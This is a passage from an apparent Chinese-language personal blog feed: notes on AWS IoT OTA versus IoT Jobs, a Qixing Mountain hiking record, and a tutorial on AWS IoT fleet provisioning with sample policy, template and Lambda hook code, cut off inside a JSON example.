刻意避免實施 bootloader，因為已經存在適用於大量受支援微控制器的多個行業範圍的 bootloader</li><li>模組化 OTA 將 bootloader和簽章驗證機制的選擇留給使用者。</li></ul><h2 id="AWS-IoT-Jobs-以及-AWS-IoT-OTA-Update差異"><a href="#AWS-IoT-Jobs-以及-AWS-IoT-OTA-Update差異" class="headerlink" title="AWS IoT Jobs 以及 AWS IoT OTA Update差異"></a>AWS IoT Jobs 以及 AWS IoT OTA Update差異</h2><ul><li>AWS IoT Jobs<ul><li>定義一組可以發送到一個或多個設備並在其上運行的遠端操作</li><li>最常見的是，作業用於執行軟體或韌體更新，但也可用於執行任何任意操作，例如重新啟動、憑證 Rotate等</li></ul></li><li>AWS IoT OTA Update<ul><li>基於 AWS IoT Jobs 建置的功能，專門實現軟體&#x2F;韌體更新操作，並且僅實現該操作</li><li>OTA 更新是一項 Job，<strong>但有預先定義的 Job文件</strong>。它捆綁了常見的軟體更新功能（例如程式碼簽署），可以能夠更快建立軟體更新解決方案</li></ul></li></ul><p>比較表格</p><table><thead><tr><th></th><th>AWS IoT Jobs</th><th>AWS IoT OTA Updates</th></tr></thead><tbody><tr><td>用途</td><td>任何自定義的行為</td><td>FreeRTOS OTA update</td></tr><tr><td>Job 文件</td><td>可自定義</td><td>預先定義</td></tr><tr><td>建立的 API</td><td>CreateJob</td><td>CreateOTAUpdate</td></tr><tr><td>程式碼簽署</td><td>需使用者自行實踐</td><td>已整合</td></tr><tr><td>HTTP&#x2F;MQTT</td><td>需使用者自行選擇</td><td>已整合</td></tr><tr><td>支援AWS IoT Device SDK</td><td>C, C++, Python, Java, Javascript</td><td>僅有 C</td></tr><tr><td>Platform Abstraction Layer (PAL)</td><td>無</td><td>有 [3]</td></tr><tr><td>Max 檔案限制</td><td>HTTP: <strong>5GB (Amazon S3 limit)</strong>, MQTT: <strong>24MB (MQTT file stream limit)</strong></td><td>16MB (OTA update limit)[4]</td></tr></tbody></table><h2 id="AWS-IoT-Over-The-Air-OTA-Library"><a href="#AWS-IoT-Over-The-Air-OTA-Library" class="headerlink" title="AWS IoT Over-The-Air (OTA) Library"></a>AWS IoT Over-The-Air (OTA) Library</h2><blockquote><p><a href="https://github.com/aws/ota-for-aws-iot-embedded-sdk">https://github.com/aws/ota-for-aws-iot-embedded-sdk</a></p></blockquote><p>這個AWS函式庫同時包含了，FreeRTOS 以及 AWS IoT Device SDK for Embedded-C</p><p>這個函式庫同時包含了<strong>OTA Platform Abstration Layer (PAL)</strong> [3] 來去簡化將函式庫遷移到特定硬體的難度 [5]。</p><p>也有  OTA Operating System (OS) Functional Interface 來去簡化移植到 FreeRTOS 以外的 RTOS 甚至是裸機的困難度。</p><blockquote><p>由於 AWS IoT OTA 適用於資源受限的設備，因此在原生的Device SDK 並沒有整合 FreeRTOS。出於同樣的原因，OTA 檔案大小限制為 16MB。</p></blockquote><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p>[1] <a href="https://www.freertos.org/freertos-core/over-the-air-updates/index.html">https://www.freertos.org/freertos-core/over-the-air-updates/index.html</a><br>[2] <a href="https://repost.aws/articles/ARDHNhV0bnRGau0kmdhTSZZA/comparing-aws-iot-jobs-and-aws-iot-over-the-air-ota-updates">https://repost.aws/articles/ARDHNhV0bnRGau0kmdhTSZZA/comparing-aws-iot-jobs-and-aws-iot-over-the-air-ota-updates</a><br>[3] <a href="https://www.freertos.org/Documentation/api-ref/ota-for-aws-iot-embedded-sdk/docs/doxygen/output/html/ota_pal_interface.html">https://www.freertos.org/Documentation/api-ref/ota-for-aws-iot-embedded-sdk/docs/doxygen/output/html/ota_pal_interface.html</a><br>[4] <a href="https://docs.aws.amazon.com/general/latest/gr/amazon-freertos.html#limits-ota-manager">https://docs.aws.amazon.com/general/latest/gr/amazon-freertos.html#limits-ota-manager</a><br>[5] Porting Guide - <a href="https://www.freertos.org/Documentation/api-ref/ota-for-aws-iot-embedded-sdk/docs/doxygen/output/html/ota_porting.html">https://www.freertos.org/Documentation/api-ref/ota-for-aws-iot-embedded-sdk/docs/doxygen/output/html/ota_porting.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT </tag>
            
            <tag> OTA </tag>
            
            <tag> Firmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【爬山紀錄】七星山主峰 + 東峰</title>
      <link href="/posts/22f14c54.html"/>
      <url>/posts/22f14c54.html</url>
      
        <content type="html"><![CDATA[<h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><p>由於生長在台北多年還沒去七星山主峰的三角點，趁著難得的好天氣出遊踩點</p><p>這次爬七星山的主要路線是從 <strong>小油坑登山口</strong> -&gt; <strong>七星山主峰</strong> -&gt; <strong>七星山東峰</strong>，接著原路返回到 <strong>小油坑停車場</strong></p><p><img src="/img/mountain-1/161346.jpg"></p><p>七星山是台北市內最高的山，海拔達到 <code>1120</code> 公尺</p><h2 id="小油坑地熱口"><a href="#小油坑地熱口" class="headerlink" title="小油坑地熱口"></a>小油坑地熱口</h2><p>地熱口附近硫磺味很重，但天氣冷其實靠近挺暖的<br><img src="/img/mountain-1/m1.jpg"></p><p>湧出的硫磺泉會沸騰冒泡<br><img src="/img/mountain-1/m2.jpg"><br><img src="/img/mountain-1/m3.jpg"><br><img src="/img/mountain-1/m4.jpg"><br><img src="/img/mountain-1/m5.jpg"><br><img src="/img/mountain-1/m6.jpg"></p><h2 id="七星山主峰"><a href="#七星山主峰" class="headerlink" title="七星山主峰"></a>七星山主峰</h2><p>通往主峰的路上幾乎都是石頭階梯，但階梯路途中挺多陡上，<strong>建議攜帶登山杖</strong></p><p><img src="/img/mountain-1/m13.jpg"><br><img src="/img/mountain-1/m8.jpg"></p><p>現在是11月的芒草季，但這裡風大，芒草都被吹得彎曲，但景色還是挺美</p><p><img src="/img/mountain-1/m7.jpg"><br><img src="/img/mountain-1/m10.jpg"></p><p>假日會很多登山客要來跟這根拍照，就自行考量要不要留個紀念了<br><img src="/img/mountain-1/m9.jpg"></p><h2 id="七星山東峰"><a href="#七星山東峰" class="headerlink" title="七星山東峰"></a>七星山東峰</h2><p>主峰往東峰的路段只需再走 <code>0.3K</code>，可以選擇一次蒐集兩個峰頂。但從七星主峰到七星東峰的部分路段較為濕滑，建議穿有防滑的登山鞋來。</p><h2 id="草叢"><a href="#草叢" class="headerlink" title="草叢"></a>草叢</h2><p>順帶一提，一路上都有很多像是下面這樣，人可以通過的樹叢，如果透過離線地圖看是可以發現路的，而且也能發現有綁繩子，舊友進去稍微探險一下，但由於後面泥濘太多，就沒有深入往下探下去了</p><p><img src="/img/mountain-1/m11.jpg"><br><img src="/img/mountain-1/m12.jpg"><br><img src="/img/mountain-1/m14.jpg"></p><p>東峰的景色個人覺得還好，但也是多人跟著合照。</p><p><img src="/img/mountain-1/m15.jpg"></p><p>之後就原路返回停車場，結束今天的旅程了</p><blockquote><p>其實大多數人都會從小油坑上去到主峰再到東峰，再從冷水坑下去或是反向路線，但由於有開車就只能原路來回拉</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 爬山健行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 北部 </tag>
            
            <tag> 小百岳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>機群佈建(Fleet Provisioning) - 預先佈建裝置到 AWS IoT</title>
      <link href="/posts/889a40ef.html"/>
      <url>/posts/889a40ef.html</url>
      
        <content type="html"><![CDATA[<h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><h2 id="什麼是機群佈建-Fleet-Provisioning"><a href="#什麼是機群佈建-Fleet-Provisioning" class="headerlink" title="什麼是機群佈建(Fleet Provisioning)?"></a>什麼是機群佈建(Fleet Provisioning)?</h2><p>機群佈建當中也有分成 <strong>要求佈建 （Provisioning by Claim）</strong> 還有 <strong>透過信任的使用者佈建 （Provisioning by Trusted User）</strong></p><h3 id="要求佈建"><a href="#要求佈建" class="headerlink" title="要求佈建"></a>要求佈建</h3><p>裝置可以使用內嵌的佈建宣告憑證（Claim Certificate）(這是特殊用途的憑證) 和私有金鑰  來製造。如果這些憑證已向 AWS IoT 註冊，該服務可以將它們交換為裝置可用於一般操作的唯一裝置憑證。</p><h3 id="透過信任的使用者佈建"><a href="#透過信任的使用者佈建" class="headerlink" title="透過信任的使用者佈建"></a>透過信任的使用者佈建</h3><p>在許多情況下，如終端使用者或安裝技術人員等信任的使用者初次使用行動應用程式在其部署的位置設定裝置時，裝置會連線至 AWS IoT</p><blockquote><p>在本篇文章中，主要會介紹透過 <strong>要求佈建</strong> 的方式來去進行機群佈建</p></blockquote><h2 id="要求佈建的流程"><a href="#要求佈建的流程" class="headerlink" title="要求佈建的流程"></a>要求佈建的流程</h2><p><img src="https://i.imgur.com/5UPLkKJ.png" alt="Imgur"></p><h2 id="設置-AWS-IoT-Core"><a href="#設置-AWS-IoT-Core" class="headerlink" title="設置 - AWS IoT Core"></a>設置 - AWS IoT Core</h2><h3 id="建立憑證以及公私鑰對"><a href="#建立憑證以及公私鑰對" class="headerlink" title="建立憑證以及公私鑰對"></a>建立憑證以及公私鑰對</h3><p>產生用於佈建的憑證。</p><ul><li>可以在 AWS IoT Console 上的 <strong>Secure</strong> &gt;&gt; <strong>Certificates</strong> &gt;&gt; <strong>Add Certificates</strong> &gt;&gt; <strong>Create Certificates</strong></li></ul><p><img src="https://i.imgur.com/ay2zm5V.png" alt="Imgur"><br><img src="https://i.imgur.com/Qnr2Olh.png" alt="Imgur"></p><ul><li>接著會跳出對應的畫面，會需要去下載憑證跟私鑰到本地端，另外為了方便也請將 Root CA 憑證下載到本地</li></ul><p><img src="https://i.imgur.com/kRUAGF9.png" alt="Imgur"></p><h3 id="建立-Provisioning-Template-並且附加-Policy"><a href="#建立-Provisioning-Template-並且附加-Policy" class="headerlink" title="建立 Provisioning Template 並且附加 Policy"></a>建立 Provisioning Template 並且附加 Policy</h3><ul><li>建立 Provisioning Template</li></ul><p><img src="https://i.imgur.com/cG83JRG.png" alt="Imgur"></p><ul><li>選擇 <strong>Provisioning deivces with claim certificates</strong>，之後點選 <strong>Nexts</strong></li></ul><p><img src="https://i.imgur.com/7baFaol.png" alt="Imgur"></p><ul><li>建立給 IoT Service 的 Role，點選 <strong>Create Role</strong></li><li>輸入完畢 Role Name 後點選 <strong>View</strong></li></ul><p><img src="https://i.imgur.com/6bZNMWr.png" alt="Imgur"></p><ul><li>Attach policy</li><li>請搜尋並附加 AWS 管理的 Policy <code>AWSIoTThingsRegistration</code></li></ul><p><img src="https://i.imgur.com/MwkIdA0.png" alt="Imgur"><br><img src="https://i.imgur.com/YW2Nfdh.png" alt="Imgur"></p><ul><li>Claim certificate policy，點選 <strong>Create IoT  Policy</strong></li></ul><p><img src="https://i.imgur.com/21XORly.png" alt="Imgur"></p><ul><li>填入 Policy Name 之後貼上範例 JSON</li></ul><p><img src="https://i.imgur.com/mNKS8IC.png" alt="Imgur"></p><p>範例 IoT Policy</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;iot:Connect&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">,</span><span class="string">&quot;iot:Receive&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topic/$aws/certificates/create/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topic/$aws/provisioning-templates/templateName/provision/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topicfilter/$aws/certificates/create/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topicfilter/$aws/provisioning-templates/templateName/provision/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Hzebj7r.png" alt="Imgur"></p><ul><li>勾選憑證</li></ul><p><img src="https://i.imgur.com/5y8PAPu.png" alt="Imgur"></p><p>完成後就可以來設定預佈建</p><h3 id="設定預先佈建"><a href="#設定預先佈建" class="headerlink" title="設定預先佈建"></a>設定預先佈建</h3><p>機群佈建的範本範例</p><blockquote><p><a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-template.html#fleet-provisioning-example">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-template.html#fleet-provisioning-example</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Parameters&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ThingName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SerialNumber&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;DeviceLocation&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Mappings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;LocationTable&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Seattle&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;LocationUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://example.aws&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Resources&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;thing&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Thing&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AttributePayload&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">                    <span class="attr">&quot;version&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;serialNumber&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;serialNumber&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;ThingName&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingTypeName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Fn::Join&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="punctuation">[</span><span class="string">&quot;ThingPrefix_&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;SerialNumber&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingGroups&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;v1-lightbulbs&quot;</span><span class="punctuation">,</span> <span class="string">&quot;WA&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;BillingGroup&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LightBulbBillingGroup&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;OverrideSettings&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AttributePayload&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;MERGE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingTypeName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;REPLACE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingGroups&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;DO_NOTHING&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;certificate&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Certificate&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;CertificateId&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Certificate::Id&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Status&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Active&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;policy&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Policy&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;PolicyDocument&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;arn:aws:iot:us-east-1:123456789012:topic/foo/bar&quot;</span><span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DeviceConfiguration&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;FallbackUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.example.com/test-site&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;LocationUrl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Fn::FindInMap&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;LocationTable&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DeviceLocation&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="string">&quot;LocationUrl&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>預先佈建掛接是 Lambda 函數，會先驗證從裝置傳遞的參數，然後才能佈建裝置。此 Lambda 函數必須存在於您的帳戶中，才能佈建裝置。</p><p>這個部分是要設定在配置設備之前執行操作。例如，根據已知設備數據庫檢查設備，以防止未經授權的設備連接到您的帳戶。</p><p><img src="https://i.imgur.com/pL1yTCM.png" alt="Imgur"></p><ul><li>選擇 <strong>Create a Lambda function</strong></li></ul><h3 id="Sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate"><a href="#Sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate" class="headerlink" title="Sample provisioning hook where you validate the request before activating a certificate"></a>Sample provisioning hook where you validate the request before activating a certificate</h3><blockquote><p>Github: <a href="https://github.com/aws-samples/aws-iot-fleet-provisioning#sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate">https://github.com/aws-samples/aws-iot-fleet-provisioning#sample-provisioning-hook-where-you-validate-the-request-before-activating-a-certificate</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> date</span><br><span class="line"></span><br><span class="line">provision_response = &#123;</span><br><span class="line">    <span class="string">&#x27;allowProvisioning&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="string">&quot;parameterOverrides&quot;</span>: &#123;<span class="string">&quot;CertDate&quot;</span>: date.today().strftime(<span class="string">&quot;%m/%d/%y&quot;</span>)&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">event, context</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">########################</span></span><br><span class="line">    <span class="comment">## Stringent validation against internal API&#x27;s/DB etc to validate the request before proceeding</span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment">## if event[&#x27;parameters&#x27;][&#x27;SerialNumber&#x27;] = &quot;approved by company CSO&quot;:</span></span><br><span class="line">    <span class="comment">##     provision_response[&quot;allowProvisioning&quot;] = True</span></span><br><span class="line">    <span class="comment">#####################</span></span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> provision_response</span><br></pre></td></tr></table></figure><h3 id="Hook-Input"><a href="#Hook-Input" class="headerlink" title="Hook Input"></a>Hook Input</h3><blockquote><p><a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/pre-provisioning-hook.html#pre-provisioning-hook-input">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/pre-provisioning-hook.html#pre-provisioning-hook-input</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;claimCertificateId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;certificateId&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;certificatePem&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;templateArn&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;arn:aws:iot:us-east-1:XXXXXXXXXXXX:provisioningtemplate/MyTemplate&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;clientId&quot;</span> <span class="punctuation">:</span> <span 